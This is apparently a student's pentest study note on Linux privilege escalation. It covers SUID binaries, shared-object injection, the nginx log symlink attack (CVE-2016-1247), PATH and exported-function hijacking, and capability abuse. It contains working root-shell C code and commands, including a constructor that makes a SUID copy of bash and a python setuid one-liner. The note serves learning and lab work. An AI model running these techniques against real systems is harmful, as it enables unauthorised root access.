SUID

Monday, January 1, 2024

8:59 PM

 

-   SUID gives user 777

-   shows in linpeas

-   not all with suid set are vulnerable but gtfobins has them

>  

 

-   show executables with suid

    -   find / -perm -u=s -type f 2\> /dev/null

    -   find / -type f -perm -04000 -ls 2\>/dev/null

 

 

-   Shared object injection

    -   when enumerating for suid we can test to see if they are running process that may contain files that are missing so that we can inject a malicious file in that place

    -   use strace and grep on the binary

        -   ![](010_SUID_000.png){width="7.8125in" height="2.7604166666666665in"}

    -   mkdir /home/user/.config

    -   nano a file called libcalc.c and write quick c exploit

> #include \<stdio.h\>
>
> #include \<stdlib.h\>
>
>  
>
> static void inject() \_\_attribute\_\_((constructor));
>
>  
>
> void inject() {
>
> system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\");
>
> }
>
>  

-   compile with gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

-   run with /usr/local/bin/suid-so

 

 

-   Binary Symlinks

    -   mix of nginx and suid

    -   <https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html>

    -   Web server permissions of nginx logs allow attacker to escalate from www-data to root

    -   often after a web exploit we come in as www-data

        -   ![](010_SUID_001.png){width="1.1875in" height="0.5104166666666666in"}

    -   If we can get linux exploit suggester on machine we can see nginex-root.sh

        -   ![](010_SUID_002.png){width="8.322916666666666in" height="1.375in"}

>  

-   We can maually see this as well with dpkg -l \| grep nginx

    -   ![](010_SUID_003.png){width="8.229166666666666in" height="0.9166666666666666in"}

    -   we are looking for version 1.6.2 or earlier

    -   SUID bit must also be set on sudo

        -   ![](010_SUID_004.png){width="6.708333333333333in" height="0.5104166666666666in"}

    -   we can also see in the log file that is has root privilege

        -   ![](010_SUID_005.png){width="4.875in" height="1.4583333333333333in"}

        -   symlink replaces log file with malicious file.

```{=html}
<!-- -->
```
-   nginx must startup or restart

-   point our malicious script at the log file

    -   ![](010_SUID_006.png){width="4.5625in" height="0.28125in"}

>  

-   ![](010_SUID_007.png){width="8.34375in" height="7.739583333333333in"}

```{=html}
<!-- -->
```
-   Need to wait for server restart, or if we have permission we can restart in a separate shell

    -   ![](010_SUID_008.png){width="5.739583333333333in" height="0.4270833333333333in"}

>  

-   ![](010_SUID_009.png){width="4.03125in" height="1.34375in"}

 

 

-   Environmental variables

    -   variables that are available systemwide and are inherited by all spawn child processes and shells

    -   env to see

    -   when testing the env variables we can see that we have suid on one we can run that attempts to start our apache server

        -   ![](010_SUID_010.png){width="7.5625in" height="0.2708333333333333in"}

>  

-   ![](010_SUID_011.png){width="5.84375in" height="3.2604166666666665in"}

```{=html}
<!-- -->
```
-   we can write some malicious c code and inject it into the path in place of service for service apache2 start

-   current PATH

    -   ![](010_SUID_012.png){width="8.135416666666666in" height="0.375in"}

-   c code for spawning a root shell

    -   echo \'int main() {setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}\' \> /tmp/service.c

    -   compile with gcc /tmp/service.c -o /tmp/service

-   export PATH=/tmp:\$PATH

-   we can now see we added /temp to PATH with our c code

    -   ![](010_SUID_013.png){width="8.104166666666666in" height="0.8541666666666666in"}

-   When we run our variable again we get a root shell

    -   ![](010_SUID_014.png){width="3.1979166666666665in" height="0.5416666666666666in"}

 

-   second example is calling a direct path

    -   ![](010_SUID_015.png){width="3.9791666666666665in" height="2.5416666666666665in"}

    -   create a malicious function

        -   function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

    -   export function

        -   export -f /usr/sbin/service

    -   ![](010_SUID_016.png){width="3.2916666666666665in" height="0.5729166666666666in"}

>  
>
>  

-   Capabilities

    -   similar to suid in concept

    -   starting with kernel 2.2 divides privileges associate with super user into distinct units that can be disabled and enabled. More secure than suids

    -   escalation can still happen

    -   getcap -r / 2\>/dev/null

        -   ![](010_SUID_017.png){width="3.1666666666666665in" height="0.5104166666666666in"}

        -   /usr/bin/python2.6 -c \'import os; os.setuid(0); os.system(\"/bin/bash\")\'

        -   ![](010_SUID_018.png){width="7.15625in" height="0.3958333333333333in"}

        -   works with a few other things look for cap_setuid+ep (premit everything)

        -   python, perl, openssl, tar
